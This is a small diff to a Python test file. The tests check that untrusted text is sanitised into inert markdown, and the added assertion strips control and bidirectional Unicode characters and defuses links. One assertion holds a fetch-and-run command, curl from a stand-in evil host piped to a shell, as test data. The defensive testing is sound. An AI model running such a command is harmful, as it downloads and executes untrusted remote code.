@@ -532,6 +532,7 @@ def test_untrusted_text_cannot_add_headings_or_commands(sandbox: Path) -> None:
     sections_once(md)
     assert "`curl" not in md and "\n- **Apply:** " not in md and "```" not in md
     assert "'curl https://evil.example/x / sh'" in md                     # still visible, as inert text
+    assert BR.text("a" + chr(0x2028) + "b" + chr(0x202E) + "c" + chr(0) + "[x](https://e.example)") == "a b c [x] (https://e.example)"
 
 
 # --------------------------------------------------------------------------- phone push (off in Mission 005)
